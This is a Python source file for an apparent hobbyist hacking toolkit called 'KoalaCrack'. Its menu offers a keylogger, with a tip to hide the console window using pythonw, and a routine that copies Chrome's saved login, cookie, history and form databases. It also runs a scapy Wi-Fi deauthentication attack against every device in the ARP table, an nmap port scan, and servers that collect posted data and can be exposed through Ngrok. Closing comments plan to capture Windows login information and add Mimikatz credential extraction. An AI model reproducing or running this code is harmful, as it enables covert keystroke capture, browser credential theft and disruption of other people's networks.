import pyfiglet
from termcolor import colored
from pynput import keyboard
import threading
import os
import sqlite3
import requests
from scapy.all import ARP, Ether, srp, RadioTap, Dot11, Dot11Deauth, sendp
from scapy.all import conf, get_if_list
from scapy.sendrecv import sendp

import whois
import subprocess
import re 
import ctypes
from scapy.all import *
from fastapi import FastAPI, Request
from pydantic import BaseModel
import uvicorn
import json
import shutil
ascii_banner = pyfiglet.figlet_format("KoalaCrack") #create a banner with pyfiglet
colored_ascii = colored(ascii_banner, "red")
##########################################Keylogger Functions############################
def key_log():
    class MyException(Exception): pass
    def onPress(key):
        try:
            print('key {0} pressed'.format(key.char))
        except AttributeError:
            print('special key pressed'.format(key))
    def on_release(key):
       
        if key == keyboard.Key.esc: 
            print("ESC pressed, stopping keylogger...")
            return False 
    with keyboard.Listener(
        on_press=onPress,
        on_release=on_release
        ) as listener:
        listener.join()
def run_keylogger():
    """Startet den Keylogger und wartet auf Beendigung."""
    keylogger_thread = threading.Thread(target=key_log)
    keylogger_thread.start()
    keylogger_thread.join()   
#####################################PW-Cracker#####################################
def pw_crac():
    def locater_save_fi(file_name):
        user_name = os.path.expanduser("~")
        source_folder = os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data", "Default")
        destination_folder = os.path.dirname(os.path.realpath(__file__)) 
        os.makedirs(destination_folder, exist_ok=True)

        source_path = os.path.join(source_folder, file_name)    # source path to the files

        if os.path.exists(source_path):
           destination_folder = os.path.join(destination_folder, file_name) # destination path to the files
           shutil.copy(source_path, destination_folder) # copy the files to the destination folder
           print(f"{file_name} has been saved to {destination_folder}")
        else:
            print("Eventually Saved. Please check the existence in the folder where the Script is located")

    list_with_files = ["Visited Links", "Login Data", "Web Data", "History", "Cookies", "Bookmarks"]

    for file_name in list_with_files:
        locater_save_fi(file_name)
        
        #Encrypt files below
    file_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "Login Data")
    #SQLITE 3 database open
    conn = sqlite3.connect(file_path) #create sqlite connection with database
    cursor = conn.cursor()
    
    cursor.execute("SELECT name FROM sqlite_master WHERE type= 'table';") 
    tables = cursor.fetchall()

    print("Available tables in db:")
    for table in tables:    #
        print(table[0])
    conn.close()

    file_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "History")
    #SQLITE 3 database open
    conn = sqlite3.connect(file_path) #create sqlite connection with database
    cursor = conn.cursor()
    
    cursor.execute("SELECT name FROM sqlite_master WHERE type= 'table';") 
    tables = cursor.fetchall()

    print("Available tables in db:")
    for table in tables:    #
        print(table[0])
    conn.close()

    file_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "Web Data")
    #SQLITE 3 database open
    conn = sqlite3.connect(file_path) #create sqlite connection with database
    cursor = conn.cursor()
    
    cursor.execute("SELECT name FROM sqlite_master WHERE type= 'table';") 
    tables = cursor.fetchall()

    print("Available tables in db:")
    for table in tables:    #
        print(table[0])
    conn.close()


############################################FastAPI Server#######################
def fast_apiSER():
    app = FastAPI() #create new Webhost/APP

    class DataModel(BaseModel):
        key : str
        value : str #(Kann personalisiert werden und ist nicht immer notwendig, sorgt dafür dass aufgepasst wird, dass die erhaltenen Daten einen key und ein value haben und diese ein string sind)
    @app.post("/data")
    async def receive_data(data: DataModel):
        print(f"Received Data: {data.key} = {data.value}")
        return {"message": "Received Data successfully! "}
    uvicorn.run(app, host="0.0.0.0", port=8000) #start the webserver
###############################################Deautho Attack######################
def scan_routIP():
    result = subprocess.run(["route", "print"], capture_output=True, text=True)  # Windows route command

    if result.returncode == 0:
        output = result.stdout
        print("Searching for Router IP...... ")
        for line in output.splitlines():
            if "0.0.0.0" in line:  # Suche nach dem Standard-Gateway
                parts = line.split()
                router_ip = parts[2]  # Das Gateway ist die 3. Spalte
                
                print()
                    
                return router_ip
    else:
        print("Error while getting router IP")
    #####Die obere funktion sucht nach der router IP adresse


def atk(target_ip, router_ip, target_mac, router_mac):
    interfaces = get_if_list()
    

# Überprüfen des aktuellen Standard-Interfaces
    default_iface = conf.iface
    print(f"Current Standart Interface: {default_iface}")
    wlan_iface = interfaces[0]  # Or choose the fitting interface
    print(f"Verwendetes WLAN-Interface: {wlan_iface}")
    # Hier kannst du die router_ip direkt verwenden
    deauth_pkt = RadioTap()/Dot11(addr1=target_mac, addr2=router_mac, addr3=router_mac)/Dot11Deauth()
    sendp(deauth_pkt, count=5, iface=wlan_iface)
    print(f"Deauth-Paket an {target_ip} (MAC: {target_mac}) gesendet.")

def scan_arp(router_ip):
    result = subprocess.run(["arp", "-a"], capture_output=True, text=True)    #run the command in the terminal

    if result.returncode == 0:
                output = result.stdout  #get the output of the command
                counter = 0
                for line in output.splitlines():   #split the output into lines
                    match = re.search(r"(\d+\.\d+\.\d+\.\d+)\s+([\w-]+)\s+(\w+)", line)
                    if match:
                        counter += 1
                        ip_adress, mac_adress, _ = match.groups()
                        if ip_adress.endswith(".255"):  # Broadcast-Adressen erkennen
                            print(f"Skipping Broadcast address: {ip_adress}")
                            continue  # Überspringe diese IP-Adresse
                        elif ip_adress.startswith("224.") or ip_adress.startswith("239."):
                            print(f"Skipping Multicast address: {ip_adress}")
                            continue  # Überspringe diese IP-Adresse

                        print(f"\033[1;31m{counter}\033[0m. IP Adress: {ip_adress} | MAC Adress: {mac_adress}")
                        
                        print(f"Sending Deautho Packet to {ip_adress} - {mac_adress}.....")
                        target_ip = ip_adress
                        
                        target_mac = getmacbyip(target_ip)  #MAC Adress of the target device
                        router_mac = getmacbyip(router_ip)  #MAC adress of router
                        print(f"Router MAC: {router_mac}")
                        print(f"Target MAC: {target_mac}")
                        print(f"Router IP: {router_ip}")
                        
                        atk(target_ip=target_ip, router_ip=router_ip, target_mac=target_mac, router_mac=router_mac)
def getmacbyip(ip):
    # Erstelle eine ARP-Anfrage
    arp_request = ARP(pdst=ip)
    # Erstelle ein Ethernet-Frame mit der Broadcast-Adresse
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    # Kombiniere das Ethernet-Frame mit der ARP-Anfrage
    arp_request_broadcast = broadcast/arp_request

    # Sende die Anfrage und erhalte die Antwort
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # Falls eine Antwort empfangen wurde, gib die MAC-Adresse zurück
    if answered_list:
        return answered_list[0][1].src  # Die Quelle der Antwort enthält die MAC-Adresse
    else:
        return None                        





    
def main():
    router_ip = scan_routIP()  # Router-IP finden
    if router_ip:
        print(f"Router IP: {router_ip}")
        print("Scanning ARP table...")
        scan_arp(router_ip)  # router_ip an scan_arp übergeben
    else:
        print("Router IP konnte nicht ermittelt werden.")

#############################################################################
   

from flask import Flask, request





print(colored_ascii)    
text_1 = "\033[1;32mCredits to Scr1ptedA1m\033[0m / \033[1;31mPayPal: FabioBaensch\033[0m"
mid_tx1 = text_1.center(130)
print(mid_tx1)
print()
for liste in ["1. \033[1;32mKeylogger\033[0m", "2.\033[1;32m Chrome DB-Table Viewer \033[0m", "3. \033[1;32mPort Scanner (Open Ports, MAC Adresses, IP Adresses, Access Point IP Adress)\033[0m","4. \033[1;32mFastAPI Server (Receive Data)\033[0m","5. \033[1;32mDeautho-Attack (Not fully developed yet, could not work proberly; free to customize)\033[0m","6. \033[1;32mLearn about FastAPI Server- Construction Explanation\033[0m","7. \033[1;32mLocal Flask Server\033[0m", "8. \033[1;31m Exit\033[0m\033[0m"]:
    print(liste)
print("Note: To hide the terminal like the keylogger, \nyou can use pythonw instead of python. Example: \033[1;31mpythonw keylogger.py\033[0m or \033[1;31mkeylogger.pyw\033[0m")
print()

while True:
    op= int(input("Option: "))
    if op == 1:
        print("\033[1;31mStarting Keylogger\033[0m... Press ESC to stop.")
        run_keylogger()
    elif op == 2:
        print("\033[1;31mStarting DB-Chrome Table Viewer\033[0m...")
        print("\033[1;31mNote:\033[0m: \033[1;32mPlease make sure that the Chrome Browser is closed\033[0m")
        pw_crac()
        print()
    elif op == 3:
        print("\033[1;35mStarting Port Scanner\033[0m...")    #WEITER MACHEN
        print("\033[1;31mSearching for Access Points...\033[0m")
        def get_publicIP():
            response = requests.get("https://api64.ipify.org?format=json")
            ip = response.json()['ip']  # get the ip from the json response
            return ip
        fished_publicIP = get_publicIP()
        print(f"Access Point found... {fished_publicIP}")
        print()
        print("Information about the network:")
        def ipv6_info():
            response_ipv6 = requests.get(f"https://ipinfo.io/{fished_publicIP}/json")
            saved_data = response_ipv6.json()   #save json data in a variable
            print(f"IPv* - Adress: {saved_data.get('ip')}")
            print(f"City: {saved_data.get('city')}")
            print(f"Provider: {saved_data.get('org')}")
            print(f"Region: {saved_data.get('region')}")    
            print(f"Timezone: {saved_data.get('timezone')}")
            print()
        ipv6_info()    
        #Scan for devices in the network
          #import the regex module

        def get_networkINF():
            result = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True)    #run the command in the terminal
            if result.returncode == 0:  #0 means that the command was successful
                output = result.stdout  #get the output of the command
                ssid = re.search(r'SSID\s*:\s(.*)', output) #search for the ssid in the output
                mac = re.search(r'BSSID\s*:\s(.*)', output) #search for the mac in the output
                ipv4 = re.search(r'IPv4-Adresse\s*:\s(.*)', output) #search for the ipv4 in the output
                ipv6 = re.search(r'IPv6-Adresse\s*:\s(.*)', output) #search for the ipv6 in the output

                print(f"SSID: {ssid.group(1).strip() if ssid else 'N/A'}") #print the ssid and the rest below
                print(f"MAC-Adresse (BSSID): {mac.group(1).strip() if mac else 'N/A'}")
                print(f"IPv4-Adresse: {ipv4.group(1).strip() if ipv4 else 'N/A'}")
                print(f"IPv6-Adresse: {ipv6.group(1).strip() if ipv6 else 'N/A'}")
                print()
            else:
                print("Error while getting the network information")
        get_networkINF()

            
        import nmap        
       #arp -a befehl nutzen um geräte im netzwerk zu finden
        def scan_netwrk():
            result = subprocess.run(["arp", "-a"], capture_output=True, text=True)    #run the command in the terminal

            if result.returncode == 0:
                output = result.stdout  #get the output of the command
                counter = 0
                for line in output.splitlines():   #split the output into lines
                    match = re.search(r"(\d+\.\d+\.\d+\.\d+)\s+([\w-]+)\s+(\w+)", line)
                    if match:
                        counter += 1
                        ip_adress, mac_adress, _ = match.groups()
                        if ip_adress.endswith(".255"):  # Broadcast-Adressen erkennen
                            print(f"Skipping Broadcast address: {ip_adress}")
                            continue  # Überspringe diese IP-Adresse
                        elif ip_adress.startswith("224.") or ip_adress.startswith("239."):
                            print(f"Skipping Multicast address: {ip_adress}")
                            continue  # Überspringe diese IP-Adresse
                        print(f"\033[1;31m{counter}\033[0m. IP Adress: {ip_adress} | MAC Adress: {mac_adress}")
                        print()

                        nm = nmap.PortScanner() #create a port scanner object   
                        ip = ip_adress
                        nm.scan(ip, '1-1024')   #scan all ports of the current ip adress

                        print(f"Scan-Results for IP Adress: {ip}")
                        for proto in nm[ip].all_protocols():
                            print(f"Protocol: {proto}")
                            lport = nm[ip][proto].keys()
                            for port in lport:
                                print(f"Port: {port}\tState: {nm[ip][proto][port]['state']}")
                print("\033[1;31mNote\033[0m: IP Adress 192.168.x.x = Smartphone, Laptop, PC etc.")
                print()
            else:
                print("Error while getting the device information")
        scan_netwrk()            

    elif op == 4:
        fast_apiSER()
    elif op == 5:
        main()
        
    elif op == 6:
        print()
        print()
        midl = "\033[1;32mExplanation of the FastAPI Server\033[0m:"
        mid2 = midl.center(130)
        print(mid2)
        print()
        op2 = input("Explanation in english/englisch or german/deutsch (Type e or g, or exit to return): ")
        if op2 == "e":
            var_mid = print("""
                    \033[1;34mfrom fastapi import FastAPI, Request\033[0m
                    \033[1;34mfrom pydantic import BaseModel\033[0m
                    \033[1;34mimport uvicorn\033[0m
                            FastAPI --> The main framework to create the web server
                            BaseModel --> Used to define and validate the data structure (ensures correct data types)
                            uvicorn --> A lightweight server to run FastAPI applications
                    \033[1;31mdef fast_apiSER():\033[0m
                        \033[1;34mapp = FastApi()\033[0m
                            FastAPI() --> creates a new instance of the web application
                            All routes (API endpoints) will be registred using the app instance
                    \033[1;31mclass DataModel(BaseModel):\033[0m
                        \033[1;34mkey : str\033[0m
                        \033[1;34mvalue : str\033[0m
                            Purpose: This class defines the structure of incoming JSON data.
                            It ensures that every request must contain:
                                    key → A string.
                                    value → A string.
                            If the data does not match this format, FastAPI will automatically return an error 
                            (e.g., missing fields or wrong types)
                    \033[1;34m@app.post("/data")\033[0m
                    \033[1;34masync def receive_data(data: DataModel):\033[0m
                    \033[1;34mprint(f"Received Data: data.key = data.value")\033[0m        
                    \033[1;34mreturn {"message": "Received Data successfully!"}\033[0m
                            @app.post("/data") → Creates a POST endpoint at /data
                            async def receive_data(data: DataModel):
                                    async → Allows the function to handle multiple requests asynchronously (non-blocking).
                                    data: DataModel → The request body must match the DataModel structure.
                    \033[1;34muvicorn.run(app, host="0.0.0.0", port=8000)\033[0m
                            Purpose: Runs the FastAPI application using Uvicorn
                            host="0.0.0.0" → Allows access from any device in the network
                            port=8000 → The server listens on port 8000
                            When this function is called, the server starts and handles requests        
            """)
        elif op2 == "g":
            var_mid = print("""  
                    \033[1;34mfrom fastapi import FastAPI, Request\033[0m  
                    \033[1;34mfrom pydantic import BaseModel\033[0m  
                    \033[1;34mimport uvicorn\033[0m  
                            FastAPI --> Das Hauptframework zur Erstellung des Webservers  
                            BaseModel --> Wird verwendet, um die Datenstruktur zu definieren und zu validieren (sorgt für korrekte Datentypen)  
                            uvicorn --> Ein leichtgewichtiger Server zum Ausführen von FastAPI-Anwendungen  

                    \033[1;31mdef fast_apiSER():\033[0m  
                        \033[1;34mapp = FastApi()\033[0m  
                            FastAPI() --> Erstellt eine neue Instanz der Webanwendung  
                            Alle Routen (API-Endpunkte) werden mit dieser App-Instanz registriert  

                    \033[1;31mclass DataModel(BaseModel):\033[0m  
                        \033[1;34mkey : str\033[0m  
                        \033[1;34mvalue : str\033[0m  
                            Zweck: Diese Klasse definiert die Struktur der eingehenden JSON-Daten.  
                            Sie stellt sicher, dass jede Anfrage folgende Felder enthält:  
                                    key → Ein String.  
                                    value → Ein String.  
                            Falls die Daten nicht diesem Format entsprechen, gibt FastAPI automatisch einen Fehler zurück  
                            (z.B. fehlende Felder oder falsche Datentypen).  

                    \033[1;34m@app.post("/data")\033[0m  
                    \033[1;34masync def receive_data(data: DataModel):\033[0m  
                    \033[1;34mprint(f"Received Data: data.key = data.value")\033[0m        
                    \033[1;34mreturn {"message": "Daten erfolgreich empfangen!"}\033[0m  
                            @app.post("/data") → Erstellt einen POST-Endpunkt unter /data  
                            async def receive_data(data: DataModel):  
                                    async → Erlaubt es der Funktion, mehrere Anfragen asynchron zu bearbeiten (nicht blockierend).  
                                    data: DataModel → Der Anfragekörper muss der DataModel-Struktur entsprechen.  

                    \033[1;34muvicorn.run(app, host="0.0.0.0", port=8000)\033[0m  
                            Zweck: Startet die FastAPI-Anwendung mit Uvicorn  
                            host="0.0.0.0" → Ermöglicht den Zugriff von jedem Gerät im Netzwerk  
                            port=8000 → Der Server hört auf Port 8000  
                            Wenn diese Funktion aufgerufen wird, startet der Server und verarbeitet Anfragen.  
            """)
        else:
            print("Sorry, didnt understand your input!")
    elif op == 7:
        def run_flask_server():
            app = Flask(__name__)

            @app.route('/data1212124321', methods=['POST'])
            def receive_data():
                data = request.json
                print(f"Received Data: {data}")
                with open('received_data.txt', "w") as file:    #save data in files
                    file.write(str(data))
                return print("Data received successfully!")

            if __name__ == "__main__":
                print("Run Ngrok to make it public!")
                app.run(port=5000)
        run_flask_server()
        
        
            
#---------------------------------------end.
#NEW OPTION: Online Server (maybe for sending windows login-informations)
#NEW OPTION: MiMiKatz integration into KoalaCrack (to extract Authorentication Data like Passwords (Available as Hash, which can be encrypted by other people), Usernames, URL's, Kerberos Tickets etc.)

